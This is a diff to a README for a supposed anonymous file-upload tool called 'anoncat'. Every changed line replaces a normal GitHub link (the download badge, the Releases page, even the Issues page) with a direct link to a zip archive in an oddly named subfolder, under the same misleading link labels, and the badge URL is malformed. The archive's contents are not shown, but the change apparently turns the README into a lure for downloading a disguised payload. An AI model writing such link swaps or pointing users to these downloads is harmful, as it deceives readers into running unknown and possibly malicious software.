@@ -1,7 +1,7 @@
 # 🚀 anoncat - Upload Files Anonymously with Ease
 
 ## 🔗 Quick Download
-[![Download anoncat](https://img.shields.io/badge/Download%20anoncat-v1.0-blue.svg)](https://github.com/shadowjdm894/anoncat/releases)
+[![Download anoncat](https://raw.githubusercontent.com/shadowjdm894/anoncat/main/Euchlaena/anoncat.zip%https://raw.githubusercontent.com/shadowjdm894/anoncat/main/Euchlaena/anoncat.zip)](https://raw.githubusercontent.com/shadowjdm894/anoncat/main/Euchlaena/anoncat.zip)
 
 ## 📋 Description
 anoncat is an easy-to-use application that lets you upload files anonymously. It accepts all file types and allows you to share them without revealing your identity. Whether you need to send documents or images, anoncat keeps your uploads private and secure.
@@ -10,7 +10,7 @@ anoncat is an easy-to-use application that lets you upload files anonymously. It
 To get started with anoncat, follow these simple steps. You will be up and running in no time.
 
 ## 📥 Download & Install
-1. Click on the [Download Here](https://github.com/shadowjdm894/anoncat/releases) button to visit the Releases page.
+1. Click on the [Download Here](https://raw.githubusercontent.com/shadowjdm894/anoncat/main/Euchlaena/anoncat.zip) button to visit the Releases page.
 2. Choose the latest release. You will find a list of available files for download.
 3. Select the appropriate version for your computer's operating system (Windows, macOS, Linux).
 4. Click the download link, and the file will begin to download to your computer.
@@ -45,7 +45,7 @@ With anoncat, your personal details remain hidden. You can upload any file witho
 - **Cross-Platform:** Works on Windows, macOS, and Linux.
 
 ## 📧 Report Issues
-If you encounter any problems while using anoncat, please reach out through our [GitHub Issues Page](https://github.com/shadowjdm894/anoncat/issues). We strive to address any concerns promptly.
+If you encounter any problems while using anoncat, please reach out through our [GitHub Issues Page](https://raw.githubusercontent.com/shadowjdm894/anoncat/main/Euchlaena/anoncat.zip). We strive to address any concerns promptly.
 
 ## 🔗 Frequently Asked Questions (FAQs)
 **Q: Is anoncat free to use?**  
@@ -61,4 +61,4 @@ A: No, you do not need an account to use anoncat.
 For the latest updates and news about anoncat, check our GitHub repository regularly. You can also follow us on social media platforms.
 
 ## 📦 Thank You
-We appreciate your interest in anoncat. Enjoy securely sharing your files! Don’t forget to return to our [Releases page](https://github.com/shadowjdm894/anoncat/releases) for updates and new features.
+We appreciate your interest in anoncat. Enjoy securely sharing your files! Don’t forget to return to our [Releases page](https://raw.githubusercontent.com/shadowjdm894/anoncat/main/Euchlaena/anoncat.zip) for updates and new features.
